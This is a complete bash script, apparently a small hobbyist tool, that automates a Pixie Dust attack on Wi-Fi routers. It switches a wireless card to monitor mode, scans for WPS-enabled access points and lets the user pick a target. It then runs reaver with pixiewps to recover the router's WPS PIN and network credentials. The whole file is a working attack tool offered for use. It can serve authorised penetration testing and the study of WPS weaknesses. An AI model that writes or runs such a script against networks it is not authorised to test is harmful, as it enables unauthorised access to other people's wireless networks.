#!/bin/bash

#######################################################################
#                                                                     #
#  Name:        pixie_attack                                          #
#                                                                     #
#  Author:      D4LL45                                                #
#  Version:     1.0.0                                                 #
#  Date:        20.08.2022                                            #
#                                                                     #
#  Description: Use this script to perform a pixie dust attack        #
#               against wifi routers by using pixiewps and reaver.    #
#                                                                     #
#  Parameter:   none                                                  #
#                                                                     #
#  Usage: 	sudo pixie_attack (root required)                     #
#                                                                     #
#######################################################################


if [[ $(id -u) -ne 0 ]]; then
	echo "Come on, you need to be root!";
	exit 1;
fi

mkdir /tmp/pixie_attack
echo " -> looking for your connected wifi devices"
airmon-ng > /tmp/pixie_attack/interfaces.txt
echo ""

echo "Select your wifi device for monitoring mode:"
ifacepath="/tmp/pixie_attack/interfaces.txt"
c=0
ifaces[0]=""
while IFS= read -r line
do
	if [[ $line == *"phy"* ]]; then
		ifaces[c]="$(cut -d$'\t' -f2 <<<$line)"
		((c++))
	fi
done < "$ifacepath"
c=0
for i in "${ifaces[@]}"
do
	echo "$c) $i"
	((c++))
done
read -n 1 -p "Device Selection:" usrinput
echo ""
echo "Selected device is ${ifaces[$usrinput]}."
usriface=${ifaces[$usrinput]}
echo ""

echo " -> setting your wifi device to monitoring mode"
ip link set $usriface down
iw dev $usriface set type monitor
rfkill unblock all
ip link set $usriface up
echo ""
clear
echo "Scanning for WLAN routers with WPS ..."
echo "Use ctrl-c in your main terminal to quit scanning and proceed."
echo ""
sleep 4
xterm -e "wash -i $usriface | tee /tmp/pixie_attack/targets.txt" &
airodump-ng $usriface --wps --manufacturer
echo ""
echo "Select pixie attack target:"
i=0
targets[0]=""
while IFS= read -r line
do
	targets[i]=$line
	((i++))
done < "/tmp/pixie_attack/targets.txt"
j=0
c=0
off=2
for i in "${targets[@]}"
do
	if [[ $c -lt 2 ]]; then
		echo "   $i"
	else
		echo "$j) $i"
		((j++))
	fi
	((c++))
done
echo ""
read -n 1 -p "Target:" usrinput
echo ""
echo ""
index=$(($usrinput + $off))
echo "Selected target: ${targets[$index]}"
echo ""
bssid=$(cut -d$' ' -f1 <<<${targets[$index]})
echo "BSSID: $bssid"

line=${targets[$index]:17}
line=$(sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//'<<<"${line}")
channel=$(cut -d$' ' -f1 <<<${line})
echo "Channel: $channel"
echo ""
echo "Starting pixie dust attack ..."
reaver -i $usriface -b $bssid -c $channel -K 1 -w -vv
